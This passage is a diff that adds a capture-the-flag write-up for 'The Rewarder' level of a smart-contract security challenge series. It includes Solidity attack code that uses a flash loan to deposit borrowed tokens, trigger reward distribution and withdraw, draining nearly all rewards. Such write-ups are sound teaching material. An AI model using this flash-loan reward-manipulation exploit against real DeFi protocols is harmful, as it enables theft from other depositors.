@@ -6,6 +6,7 @@
 - [02 Naive Receiver](#02-naive-receiver)
 - [03 Truster](#03-truster)
 - [04 Side Entrance](#04-side-entrance)
+- [05 The Rewarder](#05-the-rewarder)
 
 <!-- /MarkdownTOC -->
 
@@ -243,3 +244,55 @@ Implement `receive() external payable {}` in your contracts.
 ### References
 
 * https://solidity-by-example.org/hacks/re-entrancy/
+
+## 05 The Rewarder
+
+To beat this level, we need to comply with
+
+```solidity
+// Users should get neglegible rewards this round
+// ...
+
+// Rewards must have been issued to the player account
+// ...
+
+// The amount of rewards earned should be close to total available amount
+// ...
+
+// Balance of DVT tokens in player and lending pool hasn't changed
+// ...
+```
+
+Also, this happens at round 3: `assertEq(rewarderPool.roundNumber(), 3)`.
+
+### Solution
+
+Round number will change at `_recordSnapshot()` (provided the 5 days have passed from last round), and this function only gets triggered at the constructor and `distributeRewards()`.
+
+We can leverage a flash loan of the accounting token to get all the funds we can, deposit them into the pool, trigger `distributeRewards()` to increase the round number, and withdrawing the funds after we get the reward.
+
+```solidity
+function attack() public {
+  // borrow all the DVT you can get
+  // the flow continues at receiveFlashLoan()
+  flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
+
+  // give the reward to the player, to beat the level
+  rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
+}
+
+function receiveFlashLoan(uint256 amount) public {
+  // deposit the DVT into the rewarderPool
+  liquidityToken.approve(address(rewarderPool), amount);
+  rewarderPool.deposit(amount);
+
+  // trigger this to get rewards, and increment the round number
+  rewarderPool.distributeRewards();
+
+  // got the rewards, get the DVT back
+  rewarderPool.withdraw(amount);
+
+  // pay back the flash loan
+  liquidityToken.transfer(msg.sender, amount);
+}
+```
